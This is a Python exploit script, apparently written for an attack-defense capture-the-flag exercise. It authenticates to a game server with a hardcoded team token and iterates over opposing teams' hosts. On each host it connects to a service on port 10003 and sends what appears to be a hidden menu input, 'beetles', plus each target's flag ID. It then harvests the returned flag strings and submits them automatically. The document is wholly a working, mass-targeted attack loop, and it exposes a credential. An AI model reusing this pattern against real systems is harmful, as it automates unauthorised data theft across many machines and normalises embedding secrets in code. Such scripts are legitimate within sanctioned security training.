from swpag_client import Team
import requests
import json
import pwn

pwn.context.arch = 'amd64'
pwn.context.log_level = 'debug'

t = Team("http://actf3_team.cse545.io", "gMR4zxU0VyuNzKBzdbPD")

for team in t.get_targets(3):
    host=team['hostname']
    baby_id=team['flag_id']
    p=pwn.remote(host,'10003')
    try:
        if host=='team19':
                continue
        p.recvuntil('(1-3):')
        #p.recvline() #"Your choice (1-3): "
        #p.clean()
        p.sendline('beetles')
        p.recvuntil('ID?')
        p.sendline(baby_id)

        flag=[]

        while True:
            p.recvuntil('FLG')
            fflag=p.recv(13)
            fflag='FLG' + fflag.decode("utf-8")
            flag.append(fflag)
            print(fflag)
            t.submit_flag([fflag])
    except EOFError as error:
        continue
